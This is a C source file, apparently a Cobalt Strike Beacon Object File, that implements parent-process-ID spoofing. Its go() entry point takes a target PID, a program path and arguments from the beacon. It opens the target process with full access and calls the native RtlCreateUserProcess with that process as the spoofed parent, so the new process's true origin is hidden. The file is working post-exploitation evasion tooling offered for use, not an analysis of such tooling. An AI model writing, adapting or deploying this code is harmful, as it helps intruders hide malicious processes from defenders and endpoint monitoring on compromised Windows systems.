#include "bofdefs.h"
#include "base.c"

#define NtCurrentProcess()        ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread()         ((HANDLE)(LONG_PTR)-2)
#define STATUS_SUCCESS 0x00000000


int my_toLower(int x)
{
        if (x >= 'A' && x <= 'Z')
        {
                return x + 32;
        }

        return x;
}

int my_wcsicmp(wchar_t const* s1, wchar_t const* s2)
{
        int i = 0;
        while (s1[i] != L'\0' && s2[i] != L'\0')
        {
                if (my_toLower(s1[i]) != my_toLower(s2[i]))
                {
                        return my_toLower(s1[i]) - my_toLower(s2[i]);
                }
                i++;
        }

        return s1[i] - s2[i];
}


BOOL IsProcessElevated() //Check to see if current process is elevated
{
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);
	CloseHandle(hToken);

	return elevation.TokenIsElevated;
}

HANDLE find_process_by_name(const wchar_t* processname) //Find PID of specified process.
{
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    HANDLE hResult = NULL;
    DWORD procSession = 0;
    DWORD targetSession = 0;
    BOOL highpriv = IsProcessElevated();

    //Get session of calling process
    ProcessIdToSessionId(GetCurrentProcessId(), &procSession);

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) return(hResult);
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process and exit if unsuccessful
    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return(hResult);
    }
    do
    {
        if (0 == my_wcsicmp((wchar_t*)processname, pe32.szExeFile))
        {
            //Get session of matching target process
            ProcessIdToSessionId(pe32.th32ProcessID, &targetSession);

            if((targetSession == procSession && !highpriv) || (targetSession == 0 && highpriv))
            {
                hResult = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID); //PROCESS_CREATE_PROCESS
                if(hResult)
                    break;
            }
        }
    } while (Process32NextW(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return hResult;
}

void spf(DWORD ppid, wchar_t* program, wchar_t* commandLineArgs)
{
    HANDLE hParent = NULL;
    //Retrieve a handle to parent process for PPID spoofing if one was supplied
    /*if(wcslen(parentname) > 0)
    {
        hParent = find_process_by_name(parentname);
        if(!hParent)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to find a %ls process that can be used for PPID spoofing. Aborting Error: (%lu)\n", parentname, GetLastError());
            return;
        }
    }*/

    // Get ParenetID Handle
    hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);

    if(!hParent)
    {
        internal_printf("Failed to Open process %lu Handing. Aborting Error: (%lu)\n", ppid, GetLastError());
        return;
    }

   // Path to the image file from which the process will be created
    UNICODE_STRING NtImagePath;
    UNICODE_STRING SpoofedPath;
    UNICODE_STRING CommandLine;
    UNICODE_STRING CurrentDirectory;

    // wchar_t * program = L"F:\\zzz\\minio.exe";
    //Convert program name to NtPathName
    if (!RtlDosPathNameToNtPathName_U(program, &NtImagePath, NULL, NULL))
    {
	    internal_printf("Error: Unable to convert path name\n");
	    goto cleanup;
    }

    //Parse out program name and increment pointer by one to skip the leading backslash
    //wchar_t * procname = wcsrchr(program, L'\\') + 1;

    //wchar_t * spoolocation = L"C:\\Windows\\System32\\";
    //Assemble spoofed path for process parameters
    //BeaconPrintf(CALLBACK_OUTPUT, "Spoof Path: %ls", spoolocation);
    //wchar_t spath[MAX_PATH] = {0};
    //swprintf_s(spath, MAX_PATH, L"%ls%ls", spoolocation, procname);
    RtlInitUnicodeString(&SpoofedPath, program);

    int commandline_len = wcslen(program) + wcslen(commandLineArgs);
    if (commandline_len > 1024)
    {
	    internal_printf("Current command line length: %d, exceeding the maximum limit of 1024.\n",commandline_len);
        return;
    }

    wchar_t cline[1024] = {0};
    swprintf_s(cline, sizeof(cline), L"%ls%ls", program, commandLineArgs);
    RtlInitUnicodeString(&CommandLine, cline);

    //Assemble current directory for process parameters
    //wchar_t * currdir= L"F:\\zzz\\";

    wchar_t * procname = wcsrchr(program, L'\\') + 1;
    wchar_t currdir[MAX_PATH] = {0};

    memcpy(currdir, program, (wcslen(program) - wcslen(procname)) * sizeof(wchar_t));

    RtlInitUnicodeString(&CurrentDirectory, currdir);

    internal_printf("Unicode ntimagepath buffer is: %ls\n", NtImagePath.Buffer);
    internal_printf("Unicode path buffer is: %ls\n", SpoofedPath.Buffer);
    internal_printf("Unicode commandline buffer is: %ls\n", CommandLine.Buffer);
    internal_printf("Unicode currdir buffer is: %ls\n", CurrentDirectory.Buffer);


    // Create the process parameters
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    RTL_USER_PROCESS_INFORMATION ProcessInfo;

    //Create parameters

    NTSTATUS ntresult = RtlCreateProcessParameters(&ProcessParameters, &SpoofedPath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL);
    if(ntresult != STATUS_SUCCESS)
    {
	    internal_printf("RtlCreateProcessParameters failed: %X. Cleaning up and aborting.\n", ntresult);
        goto cleanup;
    }

    //Create process
    ntresult = RtlCreateUserProcess(&NtImagePath, OBJ_CASE_INSENSITIVE, ProcessParameters, NULL, NULL, hParent, FALSE, NULL, NULL, &ProcessInfo);
    if(ntresult != STATUS_SUCCESS)
    {
	    internal_printf("RtlCreateUserProcess failed: %X. Cleaning up and aborting.\n", ntresult);
        goto cleanup;
    }

    //Resume thread in process
    NtResumeThread(ProcessInfo.Thread, NULL);

    internal_printf("Successfully spawned %ls with PID %d\n", procname, GetProcessId(ProcessInfo.Process));

cleanup:
    //Cleanup handles and process parameters
    if(ProcessParameters)
        RtlDestroyProcessParameters(ProcessParameters);
    if(ProcessInfo.Thread)
        CloseHandle(ProcessInfo.Thread);
    if(ProcessInfo.Thread)
        CloseHandle(ProcessInfo.Process);
    if(hParent)
        CloseHandle(hParent);

}


void go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    //Extract beacon args
    DWORD ppid = BeaconDataInt(&parser);
    wchar_t* program = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* commandLineArgs = (wchar_t*)BeaconDataExtract(&parser, NULL);

    if(!bofstart())
    {
        return;
    }

    spf(ppid, program, commandLineArgs);

    printoutput(TRUE);

}
